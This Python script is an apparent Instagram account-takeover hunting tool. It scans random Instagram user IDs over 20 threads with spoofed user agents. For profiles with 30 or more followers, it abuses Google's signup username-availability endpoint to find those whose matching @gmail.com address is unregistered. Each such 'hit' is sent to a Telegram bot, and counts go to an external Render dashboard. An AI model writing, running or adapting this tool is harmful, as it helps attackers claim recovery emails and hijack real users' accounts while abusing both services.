import os, requests, sys, time, re, json, string, random, hashlib, uuid
from datetime import datetime
from threading import Thread, Lock
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
from colorama import init

init(autoreset=True)

# ================= FIXED DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Render Live URL for stats sync
        url = 'https://system-override-v2.onrender.com/update_stats'
        requests.post(url, json={'type': stat_type}, timeout=3)
    except:
        pass

# Dashboard automatically ID aur Token bhejta hai
if len(sys.argv) > 2:
    ID = sys.argv[1]
    token = sys.argv[2]
else:
    ID = input("\033[1;36mEnter ID: ")
    token = input("\033[1;36mEnter Token: ")
# =============================================================

hit_count = bad_count = 0
stats_lock = Lock()
TOKEN_FILE = 'tl.txt'
E = '\033[1;32m'; Z = '\033[1;31m'; X = '\033[1;33m'

def get_google_token():
    """Initial Google Token Setup for Gmail Checking"""
    try:
        n1 = ''.join(cc('azertyuiop') for _ in range(rr(6,9)))
        n2 = ''.join(cc('azertyuiop') for _ in range(rr(3,9)))
        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB')
        # Optimized regex for Google Token extraction
        match = re.search(r'data-initial-setup-data=".*?&quot;(.*?)&quot;', res1.text)
        if match:
            tok = match.group(1)
            host = ''.join(cc('abcdefghijklmnopqrstuvwxyz') for _ in range(20))
            with open(TOKEN_FILE, 'w') as f: f.write(f"{tok}//{host}")
        else:
            time.sleep(2)
            get_google_token()
    except:
        time.sleep(2)
        get_google_token()

if not os.path.exists(TOKEN_FILE):
    get_google_token()

def check_gmail(email_prefix):
    global hit_count, bad_count
    try:
        if not os.path.exists(TOKEN_FILE): get_google_token()
        with open(TOKEN_FILE, 'r') as f:
            tl, host = f.read().split('//')
        headers = {'google-accounts-xsrf': '1', 'user-agent': gg()}
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        res = requests.post('https://accounts.google.com/_/signup/usernameavailability', headers=headers, data=data, cookies={'__Host-GAPS': host})
        
        if '"gf.uar",1' in res.text:
            with stats_lock: hit_count += 1
            send_to_dashboard('hit')
            return True
        else:
            with stats_lock: bad_count += 1
            send_to_dashboard('bad')
            return False
    except: return False

def send_hit_telegram(username, followers):
    msg = f"""
━━━━━━━━━━━━━━━
🔥 HIGH FOLLOWER HIT!
👤 USER: @{username}
📧 EMAIL: {username}@gmail.com
📈 FOLLOWERS: {followers}
📅 YEAR: 2014-15
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    print(E + msg)
    try:
        # Fixed: No brackets [] in the API URL
        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}", timeout=10)
    except: pass

def worker():
    while True:
        try:
            lsd = ''.join(cc(string.ascii_letters + string.digits) for _ in range(16))
            # Year 2014-15 specific ID range
            id_range = str(rr(1500000000, 2100000000))
            headers = {'user-agent': gg(), 'x-fb-lsd': lsd}
            data = {'lsd': lsd, 'variables': f'{{"id":"{id_range}","render_surface":"PROFILE"}}', 'doc_id': '7397388303713986'}
            
            res = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()
            user = res.get('data', {}).get('user', {})
            username = user.get('username')
            followers = user.get('follower_count', 0)
            
            # Premium Filter: Minimum 30 followers
            if username and followers >= 30:
                if check_gmail(username):
                    send_hit_telegram(username, followers)
            else:
                send_to_dashboard('bad')
        except:
            time.sleep(1)

# Threads - 20 threads for high performance on Render
for _ in range(20):
    Thread(target=worker, daemon=True).start()

while True:
    time.sleep(10)
